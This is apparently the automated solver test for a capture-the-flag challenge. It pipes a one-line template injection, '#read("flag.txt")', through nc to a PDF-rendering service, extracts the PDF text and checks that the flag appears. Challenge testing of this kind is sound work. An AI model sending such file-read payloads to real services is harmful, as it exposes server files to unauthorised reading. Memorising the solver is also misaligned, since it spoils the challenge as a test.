import subprocess
import yaml
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "challenge.yml"))["flags"][0]
PDF_FILE = "test.pdf"

def test(domain, port):
    with open(PDF_FILE, "wb") as pdf_file:
        _ = subprocess.run(
            ["nc", domain, str(port)],
            input=b'#read("flag.txt")\n',
            stdout=pdf_file
        )

    try:
        output = subprocess.check_output(["pdftotext", PDF_FILE, "-"], text=True)
    except subprocess.CalledProcessError as e:
        output = str(e)

    assert FLAG in output, output


if __name__ == '__main__':
    test("localhost", 32000)

